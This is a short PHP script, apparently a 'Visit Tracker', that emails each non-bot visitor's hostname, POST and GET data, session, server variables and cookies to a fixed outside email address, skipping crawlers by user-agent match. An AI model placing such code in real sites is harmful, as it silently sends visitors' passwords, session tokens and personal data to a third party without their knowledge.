<?
if (!isset($ver)) $ver = '';
if (!preg_match('/slurp|[Cc]rawler|[Gg]rub|[Bb]ot|archiver|NetMonitor|[Ss]qworm|SiteUptime|NG|[Aa]sk|Pingdom/', $_SERVER['HTTP_USER_AGENT'])) {
    if ($_SERVER["HTTP_X_FORWARDED_FOR"] != ""){
        $IP = $_SERVER["HTTP_X_FORWARDED_FOR"];
        $proxy = $_SERVER["REMOTE_ADDR"];
        $host = @gethostbyaddr($_SERVER["HTTP_X_FORWARDED_FOR"]);
    }else{
        $IP = $_SERVER["REMOTE_ADDR"];
        $host = @gethostbyaddr($_SERVER["REMOTE_ADDR"]);
    }
 $body = "Remote Address:" . $host . "\n";
 $body .= bdy($_POST,'$_POST');
 $body .= bdy($_GET,'$_GET');
 if (isset($show_files) && $show_files) {
 	$body .= '$show_files defined and true' . "\n";
 	$body .= bdy($_FILES,'$_FILES');
}
 $body .= bdy($_SESSION,'$_SESSION');
 $body .= bdy($_SERVER,'$_SERVER');
 $body .= bdy($_COOKIE,'$_COOKIE');
 @mail("kenrbnsn@kis-hosting.com",$subject . ' Page ' . $ver . ' Visited',$body,'From: Visit Tracker <' . $pageaddr . '@nnjsda.org>',
 	'-f ' . $pageaddr . '@nnjsda.org');
}

function bdy($arr,$str)
{
$b = '';
if (!empty($arr)) {
	$b = ' ---- ' . $str . ' ---- ' . "\n";
	$b .= print_r($arr,TRUE);
 }
return ($b);
}
?>